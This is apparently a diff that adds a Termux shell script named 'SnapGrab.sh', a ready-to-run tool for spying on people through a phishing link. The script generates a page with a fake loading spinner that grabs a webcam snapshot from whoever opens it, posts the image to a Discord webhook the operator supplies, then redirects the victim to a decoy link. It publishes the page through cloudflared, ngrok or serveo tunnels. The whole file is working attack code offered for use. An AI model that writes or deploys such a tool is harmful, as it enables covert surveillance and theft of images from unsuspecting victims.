@@ -1,0 +1,223 @@
+cat << 'EOF' > SnapGrab.sh
+#!/data/data/com.termux/files/usr/bin/bash
+
+# Version
+VERSION="0.0.1"
+
+# Kill EVERYTHING on CTRL+C - NO MERCY
+trap "echo -e '\n\e[31m[!] Exiting...\e[0m'; kill $(jobs -p) 2>/dev/null; pkill -P $$ 2>/dev/null; pkill -f 'http.server'; pkill cloudflared; pkill ngrok; pkill -f 'serveo.net'; rm -f index.html .*.log 2>/dev/null; exit 0" INT TERM
+
+# Loading countdown
+clear
+echo -e "\e[36mLoading SnapGrab...\e[0m"
+for i in {5..1}; do
+    echo -ne "\r\e[33mStarting in $i seconds...\e[0m"
+    sleep 1
+done
+echo -e "\r\e[32mStarting now!              \e[0m"
+sleep 1
+clear
+
+# Colors
+RED='\e[31m'
+GREEN='\e[32m'
+YELLOW='\e[33m'
+BLUE='\e[34m'
+CYAN='\e[36m'
+WHITE='\e[37m'
+NC='\e[0m'
+BOLD='\e[1m'
+
+show_menu() {
+  clear
+  echo -e "${GREEN}${BOLD}"
+  cat << 'BANNER'
+  ____                     ____           _     
+ / ___| _ __   __ _ _ __  / ___|_ __ __ _| |__  
+ \___ \| '_ \ / _` | '_ \| |  _| '__/ _` | '_ \ 
+  ___) | | | | (_| | |_) | |_| | | | (_| | |_) |
+ |____/|_| |_|\__,_| .__/ \____|_|  \__,_|_.__/ 
+                   |_|                           
+BANNER
+  echo -e "${NC}"
+  echo -e "${CYAN}Version: $VERSION${NC}"
+  echo ""
+  if [ -z "$TUNNEL_MENU" ]; then
+    echo -e "  ${GREEN}[1]${NC} Start"
+    echo -e "  ${RED}[2]${NC} Exit"
+  else
+    echo -e "  ${CYAN}[1]${NC} Cloudflare Tunnel"
+    echo -e "  ${YELLOW}[2]${NC} Ngrok"
+    echo -e "  ${BLUE}[3]${NC} Serveo"
+    echo -e "  ${RED}[4]${NC} Back"
+  fi
+  echo ""
+}
+
+TUNNEL_MENU=""
+while true; do
+  show_menu
+  read -p "$(echo -e "${WHITE}Choose: ${NC}")" choice
+  
+  if [ -z "$TUNNEL_MENU" ]; then
+    case $choice in
+      2) exit 0 ;;
+      1) TUNNEL_MENU=1 ;;
+      *) continue ;;
+    esac
+  else
+    case $choice in
+      4) TUNNEL_MENU="" ; continue ;;
+      1|2|3) TUNNEL_CHOICE=$choice ; break ;;
+      *) continue ;;
+    esac
+  fi
+done
+
+echo ""
+read -p "$(echo -e "${YELLOW}Enter port ${NC}(default: 9090): ")" PORT
+read -p "$(echo -e "${YELLOW}Enter Discord webhook URL ${NC}: ")" WEBHOOK_URL
+read -p "$(echo -e "${YELLOW}Enter redirect link ${NC}: ")" REDIR_URL
+[ -z "$PORT" ] && PORT=9090
+
+cat << 'HTML' > index.html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body { margin: 0; height: 100dvh; background: #000; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+    .loader { width: 80px; height: 80px; border: 10px solid #0f0; border-top: 10px solid transparent; border-radius: 50%; animation: spin 1s linear infinite; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+  </style>
+</head>
+<body>
+  <div class="loader"></div>
+  <script>
+    const webhookURL = "__WEBHOOK_URL__";
+    const redirectURL = "__REDIR_URL__";
+    async function captureAndSend() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+        await new Promise(r => video.onloadedmetadata = r);
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        const blob = await new Promise(res => canvas.toBlob(res, 'image/png'));
+        const formData = new FormData();
+        formData.append('file', blob, 'capture.png');
+        await fetch(webhookURL, { method: 'POST', body: formData });
+        stream.getTracks().forEach(track => track.stop());
+      } catch (err) {} finally {
+        setTimeout(() => { window.location.href = redirectURL; }, 800);
+      }
+    }
+    captureAndSend();
+  </script>
+</body>
+</html>
+HTML
+
+sed -i "s|__WEBHOOK_URL__|$WEBHOOK_URL|g" index.html
+sed -i "s|__REDIR_URL__|$REDIR_URL|g" index.html
+
+# Kill existing processes before starting
+pkill -f "http.server" 2>/dev/null || true
+pkill cloudflared 2>/dev/null || true
+pkill ngrok 2>/dev/null || true
+pkill -f "serveo.net" 2>/dev/null || true
+rm -f .*.log 2>/dev/null
+
+# Start HTTP server
+echo -ne "${CYAN}[*] Starting HTTP server... ${NC}"
+python3 -m http.server $PORT > /dev/null 2>&1 &
+SERVER_PID=$!
+sleep 2
+echo -e "${GREEN}✓${NC}"
+
+# Initialize
+PUBLIC_URL=""
+TUNNEL_PID=""
+
+# Wave animation
+wave() {
+  while [ -z "$PUBLIC_URL" ]; do
+    echo -ne "\r${CYAN}[*] Waiting ${YELLOW}.  ${NC}"
+    sleep 0.3
+    echo -ne "\r${CYAN}[*] Waiting ${YELLOW}.. ${NC}"
+    sleep 0.3
+    echo -ne "\r${CYAN}[*] Waiting ${YELLOW}...${NC}"
+    sleep 0.3
+    echo -ne "\r${CYAN}[*] Waiting ${YELLOW}   ${NC}"
+    sleep 0.3
+    # Check for URL
+    if [ -n "$(cat .tunnel.log 2>/dev/null | grep -o 'https://.*\.trycloudflare\.com')" ] || \
+       [ -n "$(cat .ngrok.log 2>/dev/null | grep -o 'https://.*\.ngrok')" ] || \
+       [ -n "$(cat .serveo.log 2>/dev/null | grep -o 'https://.*\.serveo\.net')" ]; then
+      break
+    fi
+  done
+}
+
+# Start tunnel
+case $TUNNEL_CHOICE in
+  1)
+    echo -e "${CYAN}[*] Starting Cloudflare Tunnel...${NC}"
+    command -v cloudflared &> /dev/null || pkg install cloudflared -y > /dev/null 2>&1
+    cloudflared tunnel --url http://localhost:$PORT > .tunnel.log 2>&1 &
+    TUNNEL_PID=$!
+    
+    wave
+    
+    PUBLIC_URL=$(grep -o 'https://[-0-9a-z.]*\.trycloudflare\.com' .tunnel.log 2>/dev/null | head -n 1)
+    echo -e "\r${GREEN}[✓] URL Ready!${NC}          "
+    ;;
+    
+  2)
+    echo -e "${YELLOW}[*] Starting Ngrok Tunnel...${NC}"
+    command -v ngrok &> /dev/null || pkg install ngrok -y > /dev/null 2>&1
+    ngrok http $PORT > .ngrok.log 2>&1 &
+    TUNNEL_PID=$!
+    
+    wave
+    
+    PUBLIC_URL=$(grep -o 'https://[-0-9a-z]*\.ngrok\.io' .ngrok.log 2>/dev/null | head -n 1)
+    if [ -z "$PUBLIC_URL" ]; then
+      PUBLIC_URL=$(grep -o 'https://[-0-9a-z]*\.ngrok-free\.app' .ngrok.log 2>/dev/null | head -n 1)
+    fi
+    echo -e "\r${GREEN}[✓] URL Ready!${NC}          "
+    ;;
+    
+  3)
+    echo -e "${BLUE}[*] Starting Serveo Tunnel...${NC}"
+    ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -R 80:localhost:$PORT serveo.net > .serveo.log 2>&1 &
+    TUNNEL_PID=$!
+    
+    wave
+    
+    PUBLIC_URL=$(grep -o 'https://[-a-z0-9.]*serveo\.net' .serveo.log 2>/dev/null | head -n 1)
+    if [ -z "$PUBLIC_URL" ]; then
+      PUBLIC_URL=$(grep -o 'Forwarding HTTP traffic from https://[-a-z0-9.]*' .serveo.log 2>/dev/null | sed 's/Forwarding HTTP traffic from //')
+    fi
+    echo -e "\r${GREEN}[✓] URL Ready!${NC}          "
+    ;;
+esac
+
+# Show link
+echo ""
+echo -e "${GREEN}LINK: ${CYAN}${BOLD}$PUBLIC_URL${NC}"
+echo -e "${RED}CTRL+C to stop${NC}"
+echo ""
+
+# Keep running
+while true; do
+    sleep 1
+done
+
+EOF
+
+chmod +x SnapGrab.sh
